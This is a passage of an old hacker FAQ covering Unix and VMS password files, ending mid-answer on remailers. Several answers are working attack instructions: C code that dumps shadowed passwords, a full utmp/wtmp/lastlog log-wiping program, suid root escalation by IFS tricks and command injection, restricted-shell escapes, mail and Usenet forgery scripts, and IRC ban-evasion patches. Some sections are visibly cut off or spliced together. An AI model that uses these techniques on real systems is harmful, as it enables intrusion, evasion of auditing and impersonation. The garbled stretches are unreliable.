Section A: Computers
~~~~~~~~~~~~~~~~~~~~

01. How do I access the password file under Unix?

In standard Unix the password file is /etc/passwd.  On a Unix system
with either NIS/yp or password shadowing, much of the password data may
be elsewhere.  An entry in the password file consists of seven colon
delimited fields:

Username
Encrypted password (And optional password aging data)
User number
Group Number
GECOS Information
Home directory
Shell

]
] Sample entry from /etc/passwd:
]
] will:5fg63fhD3d5gh:9406:12:Will Spencer:/home/fsg/will:/bin/bash
]

Broken down, this passwd file line shows:

          Username: will
Encrypted password: 5fg63fhD3d5gh
       User number: 9406
      Group Number: 12
 GECOS Information: Will Spencer
    Home directory: /home/fsg/will
             Shell: /bin/bash


02. How do I crack Unix passwords?

Contrary to popular belief, Unix passwords cannot be decrypted.  Unix
passwords are encrypted with a one way function.  The login program
encrypts the text you enter at the "password:" prompt and compares
that encrypted string against the encrypted form of your password.

Password cracking software uses wordlists.  Each word in the wordlist
is encrypted and the results are compared to the encrypted form of the
target password.

The best cracking program for Unix passwords is currently Crack by
Alec Muffett.  For PC-DOS, the best package to use is currently
CrackerJack.  CrackerJack is available via ftp from clark.net
/pub/jcase/.


03. What is password shadowing?

Password shadowing is a security system where the encrypted password
field of /etc/passwd is replaced with a special token and the
encrypted password is stored in a separate file which is not readable
by normal system users.

To defeat password shadowing on many (but not all) systems, write a
program that uses successive calls to getpwent() to obtain the
password file.

Example:

#include <pwd.h>
main()
{
struct passwd *p;
while(p=getpwent())
printf("%s:%s:%d:%d:%s:%s:%s\n", p->pw_name, p->pw_passwd,
p->pw_uid, p->pw_gid, p->pw_gecos, p->pw_dir, p->pw_shell);
}


04. Where can I find the password file if it's shadowed?

Unix                  Path                            Token

UNICOS                /etc/udb                        *


05. What is NIS/yp?

NIS (Network Information System) in the current name for what was once
known as yp (Yellow Pages).  The purpose for NIS is to allow many
machines on a network to share configuration information, including
password data.  NIS is not designed to promote system security.  If
your system uses NIS you will have a very short /etc/passwd file that
includes a line that looks like this:

+::0:0:::

To view the real password file use this command "ypcat passwd"


06. What are those weird characters after the comma in my passwd file?

The characters are password aging data.  Password aging forces the
user to change passwords after a System Administrator specified period
of time.  Password aging can also force a user to keep a password for
a certain number of weeks before changing it.

]
] Sample entry from /etc/passwd with password aging installed:
]
] will:5fg63fhD3d,M.z8:9406:12:Will Spencer:/home/fsg/will:/bin/bash
]

Note the comma in the encrypted password field.  The characters after
the comma are used by the password aging mechanism.

]
] Password aging characters from above example:
]
] M.z8
]

The four characters are interpreted as follows:

  1: Maximum number of weeks a password can be used without changing.
  2: Minimum number of weeks a password must be used before changing.
3&4: Last time password was changed, in number of weeks since 1970.

Three special cases should be noted:

If the first and second characters are set to '..' the user will be
forced to change his/her passwd the next time he/she logs in.  The
passwd program will then remove the passwd aging characters, and the
user will not be subjected to password aging requirements again.

If the third and fourth characters are set to '..' the user will be
forced to change his/her passwd the next time he/she logs in. Password
aging will then occur as defined by the first and second characters.

If the first character (MAX) is less than the second character (MIN),
the user is not allowed to change his/her password.  Only root can
change that users password.

It should also be noted that the su command does not check the password
aging data.  An account with an expired password can be su'd to
without being forced to change the password.

07. How do I access the password file under VMS?

Under VMS, the password file is SYS$SYSTEM:SYSUAF.DAT.  However,
unlike Unix, most users do not have access to read the password file.


08. How do I crack VMS passwords?

Write a program that uses the SYS$GETUAF functions to compare the
results of encrypted words against the encrypted data in SYSUAF.DAT.

Two such programs are known to exist, CHECK_PASSWORD and
GUESS_PASSWORD.


09. What can be logged on a VMS system?

Virtually every aspect of the VMS system can be logged for
investigation.  To determine the status of the accounting on your system
use the command SHOW ACCOUNTING.  System accounting is a facility for
recording information about the use of the machine from a system
accounting perspective (resource logging such as CPU time, printer usage
etc.), while system auditing is done with the aim of logging information
for the purpose of security.  To enable accounting:
 
$ SET ACCOUNTING  [/ENABLE=(Activity...)] 
 
This enables accounting logging information to the accounting log
file SYS$MANAGER:ACCOUNTING.DAT.  This also is used to close
the current log file and open a new one with a higher version
number. 
 
The following activities can be logged:
 
        BATCH                   Termination of a batch job
        DETACHED                Termination of a detached job
        IMAGE                   Image execution
        INTERACTIVE             Interactive job termination
        LOGIN_FAILURE           Login failures
        MESSAGE                 Users messages
        NETWORK                 Network job termination
        PRINT                   Print Jobs
        PROCESS                 Any terminated process
        SUBPROCESS              Termination of  a subprocess
 
To enable security auditing use:
 
        $ SET AUDIT [/ENABLE=(Activity...)]
 
The /ALARM qualifier is used to raise an alarm to all terminals approved
as security operators, which means that you need the SECURITY
privileges.  You can determine your security auditing configuration
using $ SHOW AUDIT /ALL
 
The security auditor can be configured to log the following
activities: 

        ACL                     Access Control List requested events
        AUTHORIZATION           Modification to the system user
                                authorization file  SYS$SYSTEM:SYSUAF.DAT
        BREAKIN                 Attempted Break-ins
        FILE_ACCESS             File or global section access
        INSTALL                 Occurrence of any INSTALL operations
        LOGFAILURE              Any login failures
        LOGIN                   A login attempt from various sources
	LOGOUT                  Logouts 
        MOUNT                   Mount or dismount requests


10. What privileges are available on a VMS system?
  
ACNT            Allows you to restrain accounting messages
ALLSPOOL        Allows you to allocate spooled devices
ALTPRI          Allot Priority.  This allows you to set any priority
                value
BUGCHK          Allows you make bug check error log entries
BYPASS          Enables you to disregard protections
CMEXEC/  
CMKRNL          Change to executive or kernel mode.  These privileges
                allow a process to execute optional routines with KERNEL
                and EXECUTIVE access modes. CMKRNL is the most powerful
                privilege on VMS as anything protected can be accessed
                if you have this privilege.  You must have these
                privileges to gain access to the kernel data structures
                directly.
DETACH          This privilege allow you to create detached processes of
                arbitrary UICs
DIAGNOSE        With this privilege you can diagnose devices
EXQUOTA         Allows you to exceed your disk quota
GROUP           This privilege grants you permission to  affect other
                processes in the same rank
GRPNAM          Allows you to insert group logical names into the group
                logical names table.
GRPPRV          Enables you to access system group objects through
                system protection field
LOG_IO          Allows you to issue logical input output requests
MOUNT           May execute the mount function
NETMBX          Allows you to create network connections
OPER            Allows you to perform operator functions
PFNMAP          Allows you to map to specific physical pages
PHY_IO          Allows you to perform physical input output requests
PRMCEB          Can create permanent common event clusters

11. How do I break out of a restricted shell?

On poorly implemented restricted shells you can break out of the
restricted environment by running a program that features a shell
function.  A good example is vi.  Run vi and use this command:

:set shell=/bin/sh

then shell using this command:

:shell

If your restricted shell prevents you from using the "cd" command, ftp
into your account and you may be able to cd.


12. How do I gain root from a suid script or program?

1. Change IFS.

If the program calls any other programs using the system() function
call, you may be able to fool it by changing IFS.  IFS is the Internal
Field Separator that the shell uses to delimit arguments.

If the program contains a line that looks like this:

system("/bin/date")

and you change IFS to '/' the shell will them interpret the
proceeding line as:

bin date

Now, if you have a program of your own in the path called "bin" the
suid program will run your program instead of /bin/date.

To change IFS, use this command:

IFS='/';export IFS      # Bourne Shell
setenv IFS '/'          # C Shell
export IFS='/'          # Korn Shell


2. link the script to -i

Create a symbolic link named "-i" to the program.  Running "-i"
will cause the interpreter shell (/bin/sh) to start up in interactive
mode.  This only works on suid shell scripts.

Example:

% ln suid.sh -i
% -i
#


3. Exploit a race condition

Replace a symbolic link to the program with another program while the
kernel is loading /bin/sh.

Example:

nice -19 suidprog ; ln -s evilprog suidroot


4. Send bad input to the program.

Invoke the name of the program and a separate command on the same
command line.

Example:

suidprog ; id


13. How do I erase my presence from the system logs?

Edit /etc/utmp, /usr/adm/wtmp and /usr/adm/lastlog. These are not text
files that can be edited by hand with vi, you must use a program
specifically written for this purpose.

Example:

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>
#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"
 
int f;
 
void kill_utmp(who)
char *who;
{
    struct utmp utmp_ent;
 
  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 write (f, &utmp_ent, sizeof (utmp_ent));
            }
     close(f);
  }
}
 
void kill_wtmp(who)
char *who;
{
    struct utmp utmp_ent;
    long pos;
 
    pos = 1L;
    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
 
     while(pos != -1L) {
        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
          pos = -1L;
        } else {
          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
               bzero((char *)&utmp_ent,sizeof(struct utmp ));
               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
               write (f, &utmp_ent, sizeof (utmp_ent));
               pos = -1L;
          } else pos += 1L;
        }
     }
     close(f);
  }
}
 
void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;
 
     if ((pwd=getpwnam(who))!=NULL) {
 
        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            bzero((char *)&newll,sizeof( newll ));
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        }
 
    } else printf("%s: ?\n",who);
}
 
main(argc,argv)
int argc;
char *argv[];
{
    if (argc==2) {
        kill_lastlog(argv[1]);
        kill_wtmp(argv[1]);
        kill_utmp(argv[1]);
        printf("Zap2!\n");
    } else
    printf("Error.\n");
}


14. How do I send fakemail?

Telnet to port 25 of the machine you want the mail to appear to
originate from.  Enter your message as in this example:

 HELO bellcore.com
 MAIL FROM:voyager@bellcore.com
 RCPT TO:president@whitehouse.gov
 DATA
 From: voyager@bellcore.com (The Voyager)
 To: president@whitehouse.gov
 Subject: Clipper
 Reply-To: voyager@bellcore.com

	Please discontinue your silly Clipper initiative.
 .
 QUIT

On systems that have RFC 931 implemented, spoofing your "MAIL FROM:"
line will not work.  Test by sending yourself fakemail first.

For more information read RFC 822 "Standard for the format of ARPA
Internet text messages."


15. How do I fake posts and control messages to UseNet?

 From: Anonymous (Pretending to be: tale@uunet.uu.net (David C Lawrence))
 Subject: FAQ: Better living through forgery
 Date: 19 Mar 1995 02:37:09 GMT

	Anonymous netnews without "anonymous" remailers

 Inspired by the recent "NetNews Judges-L" events, this file has been
 updated to cover forging control messages, so you can do your own
 article canceling and create and destroy your own newsgroups.

 Save any news article to a file.  We'll call it "hak" in this example.

 Edit "hak", and remove any header lines of the form

         From some!random!path!user   (note: "From ", not "From: " !!)
         Article:
         Lines:
         Xref:

 Shorten the Path: header down to its LAST two or three "bangized"
 components. This is to make the article look like it was posted from
 where it really was posted, and originally hit the net at or near the
 host you send it to.  Or you can construct a completely new Path: line
 to reflect your assumed alias.

 Make some change to the Message-ID: field, that isn't likely to be
 duplicated anywhere.  This is usually best done by adding a couple of
 random characters to the part before the @, since news posting programs
 generally use a fixed-length field to generate these IDs.

 Change the other headers to say what you like -- From:, Newsgroups:,
 Sender:, etc.  Replace the original message text with your message.  If
 you are posting to a moderated group or posting a control message,
 remember to put in an Approved: header to bypass the moderation
 mechanism.

 To specifically cancel someone else's article, you need its message-ID.
 Your message headers, in addition to what's already there, should also
 contain the following with that message-ID in it.  This makes it a
 "control message". NOTE: control messages generally require an
 Approved: header as well, so you should add one.

 Subject: cmsg cancel <xb8700A@twits.site.com>
 Control: cancel <xb8700A@twits.site.com>
 Approved: luser@twits.site.com

 Newsgroups are created and destroyed with control messages, too.  If
 you wanted to create, for instance, comp.misc.microsoft.sucks, your
 control headers would look like

 Subject: cmsg newgroup comp.misc.microsoft.sucks
 Control: newgroup comp.misc.microsoft.sucks

 Add on the string "moderated" at the end of these if you want the group
 to be "moderated with no moderator" as with alt.hackers.  Somewhere in
 the body of your message, you should include the following text,
 changed with the description of the group you're creating:

 For your newsgroups file:
 comp.misc.microsoft.sucks               We don't do windows

 To remove a group, substitute "rmgroup" for "newgroup" in the header
 lines above.  Keep in mind that most sites run all "rmgroup" requests
 through a human news-master, who may or may not decide to honor it.
 Group creation is more likely to be automatic than deletion at most
 installations.  Any newsgroup changes are more likely to take effect if
 the come from me, since my name is hardwired into many of the NNTP
 control scripts, so using the From: and Approved: headers from this
 posting is recommended.

 Save your changed article, check it to make sure it contains NO
 reference to yourself or your own site, and send it to your favorite
 NNTP server that permits transfers via the IHAVE command, using the
 following script:

 =======================
 #! /bin/sh
 ## Post an article via IHAVE.
 ## args: filename server

  if test "$2" = "" ; then
   echo usage: $0 filename server
   exit 1
 fi
 if test ! -f $1 ; then
   echo $1: not found
   exit 1
 fi

 # suck msg-id out of headers, keep the brackets
 msgid=`sed -e '/^$/,$d' $1 | egrep '^[Mm]essage-[Ii][Dd]: ' | \
   sed 's/.*-[Ii][Dd]: //'`
 echo $msgid

 ( sleep 5
   echo IHAVE $msgid
   sleep 5
   cat $1
   sleep 1
    echo "."
   sleep 1
   echo QUIT ) | telnet $2 119
 =======================

 If your article doesn't appear in a day or two, try a different server.
 They are easy to find.  Here's a script that will break a large file
 full of saved netnews into a list of hosts to try.  Edit the output of
 this if you want, to remove obvious peoples' names and other trash.

 =======================
 #! /bin/sh
 FGV='fgrep -i -v'
 egrep '^Path: ' $1 | sed -e 's/^Path: //' -e 's/!/\
 /g' | sort -u | fgrep . | $FGV .bitnet | $FGV .uucp
 =======================

 Once you have your host list, feed it to the following script.

  =======================
 #! /bin/sh

 while read xx ; do
 if test "$xx" = "" ; then continue;
 fi
 echo === $xx
 ( echo open $xx 119
   sleep 5
   echo ihave IamSOk00l@podunk.edu
   sleep 4
   echo .
   echo quit
   sleep 1
   echo quit
 ) | telnet
 done
 =======================

 If the above script is called "findem" and you're using csh, you should do

         findem < list >& outfile

 so that ALL output from telnet is captured.  This takes a long time,
 but when it finishes, edit "outfile" and look for occurrences of "335".
 These mark answers from servers that might be willing to accept an
 article.  This isn't a completely reliable indication, since some
 servers respond with acceptance and later drop articles.  Try a given
 server with a slightly modified repeat of someone else's message, and
 see if it eventually appears.

 Sometimes the telnets get into an odd state, and freeze, particularly
 when a host is refusing NNTP connections.  If you manually kill these
 hung telnet processes but not the main script, the script will continue
 on.  In other words, you may have to monitor the finding script a
 little while it is running.

 You will notice other servers that don't necessarily take an IHAVE, but
 say "posting ok".  You can probably do regular POSTS through these, but
 they will add an "NNTP-Posting-Host: " header containing the machine
 YOU came from and are therefore unsuitable for completely anonymous
 use.

 PLEASE USE THE INFORMATION IN THIS ARTICLE FOR CONSTRUCTIVE PURPOSES ONLY.


16. How do I hack ChanOp on IRC?

Find a server that is split from the rest of IRC and create your own
channel there using the name of the channel you want ChanOp on.  When
that server reconnects to the net, you will have ChanOp on the real
channel.  If you have ServerOp on a server, you can cause it to split
on purpose.


17. How do I modify the IRC client to hide my real username?

Note: This FAQ answer was written by someone else, but I do not know who.
      If you know who originally wrote this, please e-mail me.

 -- BEGIN QUOTED TEXT --

Applying these changes to the source code for your ircII client and
recompiling gives you a new ircII command: /NEWUSER.  This new command
can be used as follows:

 *   /NEWUSER <new_username> [new_IRCNAME]
 *       <new_username> is a new username to use and is required
 *       [new_IRCNAME] is a new IRCNAME string to use and is optional
 *   This will disconnect you from your server and reconnect using
 *     the new information given.  You will rejoin all channel you
 *     are currently on and keep your current nickname.

The effect is basically changing your username/IRCname on the fly.
Although you are disconnected from your server and reconnected, the
ircII client is never exited, thus keeping all your state information
and aliases intact.  This is ideal for bots that wish to be REALLY
obnoxious in ban evasion. ;)

As this is now a new command in ircII, it can be used in scripts. Be
aware that the reconnect associated with the NEWUSER command takes time,
so TIMER any commands that must immediately follow the NEWUSER. For
example... ban evasion made easy (but beware infinite reconnects when
your site is banned):

on ^474 * {
  echo *** Banned from channel $1
  if ($N == [AnnMurray]) {
    nick $randomstring
    join $1
    } {
    nick AnnMurray
    newuser $randomstring
    timer 5 join $1
    }
  }

Or just to be annoying... a /BE <nickname> alias that will assume a
person's username and IRCNAME:

alias be {
  ^on ^311 * {
    ^on 311 -*
    newuser $2 $5-
    }
  whois $0
  }

Now... in order to add this command to your ircII client, get the latest
client source (or whatever client source you are using).  Cd into the
source directory and edit the file "edit.c".  Make the following
changes:

Locate the line which reads:
extern  void    server();

Insert the following line after it:
static  void    newuser();

This pre-defines a new function "newuser()" that we'll add later.


Now, locate the line which reads:
	"NAMES",        "NAMES",        funny_stuff,            0,

Insert the following line after it:
	"NEWUSER",      NULL,           newuser,                0,

This adds a new command NEWUSER to the list of valid IRCII commands, and
tells it to call our new function newuser() to perform it.


Finally, go the bottom of the file and add the following code as our new
function "newuser()":

/*
 * newuser: the /NEWUSER command.  Added by Hendrix
 *   Parameters as follows:
 *     /NEWUSER <new_username> [new_IRCNAME]
 *       <new_username> is a new username to use and is required
 *       [new_IRCNAME] is a new IRCNAME string to use and is optional
 *   This will disconnect you from your server and reconnect using
 *     the new information given.  You will rejoin all channels you
 *     are currently on and keep your current nickname.
 */

static void    newuser(command, args)
char    *command,
	*args;
{
	char    *newuname;

	if (newuname = next_arg(args, &args))
	{
		strmcpy(username, newuname, NAME_LEN);
		if (*args)
			strmcpy(realname, args, REALNAME_LEN);
		say("Reconnecting to server...");
		close_server(from_server);
		if (connect_to_server(server_list[from_server].name,
		      server_list[from_server].port, primary_server) != -1)
		{
			change_server_channels(primary_server, from_server);
			set_window_server(-1, from_server, 1);
		}
		else
			say("Unable to reconnect. Use /SERVER to connect.");
	}
	else
		say("You must specify a username and, optionally, an IRCNAME");
}

 -- END QUOTED TEXT --

/NEWUSER will not hide you from a CTCP query.  To do that, modify ctcp.c
as shown in the following diff and set an environment variable named
CTCPFINGER with the information you would like to display when queried.

*** ctcp.old
--- ctcp.c
***************
*** 334 ****
!       char    c;
--- 334 ---
!       char    c, *fing;
***************
*** 350,354 ****
!               if (pwd = getpwuid(uid))
		{
			char    *tmp;
--- 350,356 ----
!               if (fing = getenv("CTCPFINGER"))
!                       send_ctcp_reply(from, ctcp->name, fing, diff, c);
!               else if (pwd = getpwuid(uid))
		{
			char    *tmp;


18. How to I change to directories with strange characters in them?

These directories are often used by people trying to hide information,
most often warez (commercial software).

There are several things you can do to determine what these strange
characters are.  One is to use the arguments to the ls command that
cause ls to give you more information:

From the man page for ls:

    -F   Causes directories to be marked with a trailing ``/'',
	 executable files to be marked with a trailing ``*'', and
	 symbolic links to be marked with a trailing ``@'' symbol.

    -q   Forces printing of non-graphic characters in filenames as the
	 character ``?''.

    -b   Forces printing of non-graphic characters in the \ddd
	 notation, in octal.

Perhaps the most useful tool is to simply do an "ls -al filename" to
save the directory of the remote ftp site as a file on your local
machine.  Then you can do a "cat -t -v -e filename" to see exactly
what those bizarre little characters are.

From the man page for cat:

    -v  Causes non-printing characters (with the exception of tabs,
	newlines, and form feeds) to be displayed.  Control characters
	are displayed as ^X (<Ctrl>x), where X is the key pressed with
	the <Ctrl> key (for example, <Ctrl>m is displayed as ^M).  The
	<Del> character (octal 0177) is printed as ^?.  Non-ASCII
	characters (with the high bit set) are printed as M -x, where
	x is the character specified by the seven low order bits.

    -t  Causes tabs to be printed as ^I and form feeds as ^L.  This
	option is ignored if the -v option is not specified.

    -e  Causes a ``$'' character to be printed at the end of each line
	(prior to the new-line).  This option is ignored if the -v
	option is not set.

If the directory name includes a <SPACE> or a <TAB> you will need to
enclose the entire directory name in quotes.  Example:

cd "..<TAB>"

On an IBM-PC, you may enter these special characters by holding down
the <ALT> key and entering the decimal value of the special character
on your numeric keypad.  When you release the <ALT> key, the special
character should appear on your screen.  An ASCII chart can be very
helpful.

Sometimes people will create directories with some of the standard
stty control characters in them, such as ^Z (suspend) or ^C (intr).
To get into those directories, you will first need to user stty to
change the control character in question to another character.

From the man page for stty:

    Control assignments

    control-character C
                      Sets control-character to C, where control-character is
                      erase, kill, intr (interrupt), quit, eof, eol, swtch
                      (switch), start, stop or susp.

                      start and stop are available as possible control char-
                      acters for the control-character C assignment.

                      If C is preceded by a caret (^) (escaped from the
                      shell), then the value used is the corresponding con-
                      trol character (for example, ^D is a <Ctrl>d; ^? is
                      interpreted as DELETE and ^- is interpreted as unde-
                      fined).

Use the stty -a command to see your current stty settings, and to
determine which one is causing you problems.


19. What is ethernet sniffing?

Ethernet sniffing is listening (with software) to the raw ethernet
device for packets that interest you.  When your software sees a
packet that fits certain criteria, it logs it to a file.  The most
common criteria for an interesting packet is one that contains words
like "login" or "password."

Many ethernet sniffers are available, here are a few that may be on
your system now:

20. What is an Internet Outdial?

An Internet outdial is a modem connected to the Internet than you can
use to dial out.  Normal outdials will only call local numbers.  A GOD
(Global OutDial) is capable of calling long distance.  Outdials are an
inexpensive method of calling long distance BBS's.


21. What are some Internet Outdials?

This FAQ answer is excerpted from CoTNo #5:

			Internet Outdial List v3.0
			 by Cavalier and DisordeR


Introduction
------------
There are several lists of Internet outdials floating around the net these
days. The following is a compilation of other lists, as well as v2.0 by
DeadKat(CoTNo issue 2, article 4). Unlike other lists where the author
just ripped other people and released it, we have sat down and tested
each one of these. Some of them we have gotten "Connection Refused" or
it timed out while trying to connect...these have been labeled dead.


			   Working Outdials

Default accounts for Micro/RSX:

		MICRO/RSX

Alternately you can hit <CTRL-Z>  when the boot sequence asks you for the
date and create an account using:

		RUN ACNT
	    or  RUN $ACNT

(Numbers below 10 {oct} are privileged)

Reboot and wait for the date/time question. Type ^C and at the MCR prompt,
type "abo at." You must include the . dot!

If this works, type "acs lb0:/blks=1000" to get some swap space so the
new step won't wedge.

type " run $acnt" and change the password of any account with a group
number of 7 or less.

You may find that the ^C does not work. Try ^Z and ESC as well.
Also try all 3 as terminators to valid and invalid times.

If none of the above work, use the halt switch to halt the system,
just after a invalid date-time.  Look for a user mode PSW 1[4-7]xxxx.
then deposit 177777 into R6, cross your fingers, write protect the drive
and continue the system.  This will hopefully result in indirect blowing
up...  And hopefully the system has not been fully secured.

assignments for that machine.  For a complete list of port
assignments, read RFC (Request For Comments) 1700 "Assigned Numbers"


25.  What is a trojan/worm/virus/logic bomb?

This FAQ answer was written by Theora:

Trojan:

Remember the Trojan Horse?  Bad guys hid inside it until they could
get into the city to do their evil deed.  A trojan computer program is
similar.  It is a program which does an unauthorized function, hidden
inside an authorized program.  It does something other than what it
claims to do, usually something malicious (although not necessarily!),
and it is intended by the author to do whatever it does.  If it's not
intentional, its called a 'bug' or, in some cases, a feature :) Some
virus scanning programs detect some trojans.  Some virus scanning
programs don't detect any trojans.  No virus scanners detect all
trojans.

Virus:

A virus is an independent program which reproduces itself.  It may
attach to other programs, it may create copies of itself (as in
companion viruses).  It may damage or corrupt data, change data, or
degrade the performance of your system by utilizing resources such as
memory or disk space.  Some virus scanners detect some viruses.  No
virus scanners detect all viruses.  No virus scanner can protect
against "any and all viruses, known and unknown, now and forevermore".

Worm:

Made famous by Robert Morris, Jr. , worms are programs which reproduce
by copying themselves over and over, system to system, using up
resources and sometimes slowing down the systems.  They are self
contained and use the networks to spread, in much the same way viruses
use files to spread.  Some people say the solution to viruses and
worms is to just not have any files or networks.  They are probably
correct.  We would include computers.

Logic Bomb:

Code which will trigger a particular form of 'attack' when a
designated condition is met.  For instance, a logic bomb could delete
all files on Dec.  5th.  Unlike a virus, a logic bomb does not make
copies of itself.


26.  How can I protect myself from viruses and such?

This FAQ answer was written by Theora:

The most common viruses are boot sector infectors.  You can help protect
yourself against those by write protecting all disks which you do not
need write access to.  Definitely keep a set of write protected floppy
system disks.  If you get a virus, it will make things much simpler.
And, they are good for coasters.  Only kidding.

Scan all incoming files with a recent copy of a good virus scanner.
Among the best are F-Prot, Dr.  Solomon's Anti-virus Toolkit, and
Thunderbyte Anti-Virus.  AVP is also a good program.  Using more than
one scanner could be helpful.  You may get those one or two viruses that
the other guy happened to miss this month.

New viruses come out at the rate of about 8 per day now.  NO scanner can
keep up with them all, but the four mentioned here do the best job of
keeping current.  Any _good_ scanner will detect the majority of common
viruses.  No virus scanner will detect all viruses.

Right now there are about 5600 known viruses.  New ones are written all
the time.  If you use a scanner for virus detection, you need to make
sure you get frequent updates.  If you rely on behavior blockers, you
should know that such programs can be bypassed easily by a technique
known as tunnelling.

You may want to use integrity checkers as well as scanners.  Keep in
mind that while these can supply added protection, they are not
foolproof.

You may want to use a particular kind of scanner, called resident
scanners.  Those are programs which stay resident in the computer memory
and constantly monitor program execution (and sometimes even access to
the files containing programs).  If you try to execute a program, the
resident scanner receives control and scans it first for known viruses.
Only if no such viruses are found, the program is allowed to execute.

Most virus scanners will not protect you against many kinds of trojans,
any sort of logic bombs, or worms.  Theoretically, they _could_ protect
you against logic bombs and/or worms, by addition of scanning strings;
however, this is rarely done.

The best, actually only way, to protect yourself is to know what you
have on your system and make sure what you have there is authorized by
you.  Make frequent backups of all important files.  Keep your DOS
system files write protected.  Write protect all disks that you do not
need to write to.  If you do get a virus, don't panic.  Call the support
department of the company who supplies your anti-virus product if you
aren't sure of what you are doing.  If the company you got your
anti-virus software from does not have a good technical support
department, change companies.

The best way to make sure viruses are not spread is not to spread them.
Some people do this intentionally.  We discourage this. Viruses aren't
cool.


27.  Where can I get more information about viruses?

This FAQ answer was written by Theora:

Assembly language programming books illustrate the (boring) aspect of
replication and have for a long time.  The most exciting/interesting
thing about viruses is all the controversy around them.  Free speech,
legality, and cute payloads are a lot more interesting than "find first,
find next" calls.  You can get information about the technical aspects
of viruses, as well as help if you should happen to get a virus, from
the virus-l FAQ, posted on comp. virus every so often. You can also pick
up on the various debates there.  There are alt.virus type newsgroups,
but the level of technical expertise is minimal, and so far at least
there has not been a lot of real "help" for people who want to get -rid-
of a virus.

There are a lot of virus experts.  To become one, just call yourself
one.  Only Kidding.  Understanding viruses involves understanding
programming, operating systems, and their interaction.  Understanding
all of the 'Cult of Virus' business requires a lot of discernment. There
are a number of good papers available on viruses, and the Cult of Virus;
you can get information on them from just about anyone listed in the
virus-l FAQ.  The FTP site ftp.informatik.uni-hamburg.de is a pretty
reliable site for programs and text.


28. What is Cryptoxxxxxxx?

This FAQ answer is excerpted from: Computer Security Basics
                                   by Deborah Russell
                                   and G.T. Gengemi Sr.

A message is called either plaintext or cleartext.  The process of
disguising a message in such a way as to hide its substance is called
encryption.  An encrypted message is called ciphertext.  The process
of turning ciphertext back into plaintext is called decryption.

The art and science of keeping messages secure is called cryptography,
and it is practiced by cryptographers.  Cryptanalysts are
practitioners of cryptanalysis, the art and science of breaking
ciphertext, i.e. seeing through the disguise.  The branch of
mathematics embodying both cryptography and cryptanalysis is called
cryptology, and it's practitioners are called cryptologists.


29. What is PGP?

This FAQ answer is excerpted from: PGP(tm) User's Guide
                                   Volume I: Essential Topics
                                   by Philip Zimmermann

PGP(tm) uses public-key encryption to protect E-mail and data files.
Communicate securely with people you've never met, with no secure
channels needed for prior exchange of keys.  PGP is well featured and
fast, with sophisticated key management, digital signatures, data
compression, and good ergonomic design.

Pretty Good(tm) Privacy (PGP), from Phil's Pretty Good Software, is a
high security cryptographic software application for MS-DOS, Unix,
VAX/VMS, and other computers.  PGP allows people to exchange files or
messages with privacy, authentication, and convenience.  Privacy means
that only those intended to receive a message can read it.
Authentication means that messages that appear to be from a particular
person can only have originated from that person. Convenience means
that privacy and authentication are provided without the hassles of
managing keys associated with conventional cryptographic software.  No
secure channels are needed to exchange keys between users, which makes
PGP much easier to use.  This is because PGP is based on a powerful
new technology called "public key" cryptography.

PGP combines the convenience of the Rivest-Shamir-Adleman (RSA)
public key cryptosystem with the speed of conventional cryptography,
message digests for digital signatures, data compression before
encryption, good ergonomic design, and sophisticated key management. 
And PGP performs the public-key functions faster than most other
software implementations.  PGP is public key cryptography for the
masses.


30. What is Tempest?

Tempest stands for Transient Electromagnetic Pulse Surveillance
Technology.

Computers and other electronic equipment release interference to their
surrounding environment.  You may observe this by placing two video
monitors close together.  The pictures will behave erratically until you
space them apart.

What is important for an observer is the emission of digital pulses (1s
and 0s) as these are used in computers.  The channel for this radiation
is in two arrangements, radiated emissions and conducted emissions.
Radiated emissions are assembled when components in electrical devices
form to act as antennas.  Conducted emissions are formed when radiation
is conducted along cables and wires.

Although most of the time these emissions are simply annoyances, they
can sometimes be very helpful.  Suppose we wanted to see what project a
target was working on.  We could sit in a van outside her office and use
sensitive electronic equipment to attempt to pick up and decipher the
radiated emissions from her video monitor.  These emissions normally
exist at around 55-245 Mhz and can be picked up as far as one kilometer
away.

A monitoring device can distinguish between different sources emitting
radiation because the sources emanating the radiation are made up of
dissimilar elements and so this coupled with other factors varies the
emitted frequency.  For example different electronic components in VDUs,
different manufacturing processes involved in reproducing the VDUs,
different line syncs, etc...  By synchronizing our raster with the
targets raster we can passively draw the observed screen in real-time.
This technology can be acquired by anyone, not just government agencies.

The target could shield the emissions from her equipment or use
equipment that does not generate strong emissions.  However, Tempest
equipment is not legal for civilian use in the United States.

Tempest is the US Government program for evaluation and endorsement of
electronic equipment that is safe from eavesdropping.  Tempest
certification refers to the equipment having passed a testing phase and
agreeing to emanations rules specified in the government document NACSIM
5100A (Classified).  This document sets forth the emanation levels that
the US Government believes equipment can give off without compromising
the information it is processing.


31. What is an anonymous remailer?

This FAQ answer was written by Raph Levien:

An anonymous remailer is a system on the Internet that allows you to
send e-mail or post messages to Usenet anonymously.

There are two sorts of remailers in widespread use.  The first is the
anon.penet.fi style, the second is the cypherpunk style.  The remailer
at anon.penet.fi is immensely popular, with over 160,000 users over its
lifetime, and probably tens of thousands of messages per day.  Its main
advantage is that it's so easy to use.  The cypherpunks mailers, which
provide much better security, are becoming more popular, however, as
there is more awareness of them.

The user of the anon.penet.fi system first needs to get an anonymous id.
This is done either by sending mail to somebody who already has one (for
example, by replying to a post on Usenet), or sending mail to
ping@anon.penet.fi.  In either case, penet will mail back the new anon
id, which looks like an123456@anon.penet.fi.  If an123456 then sends
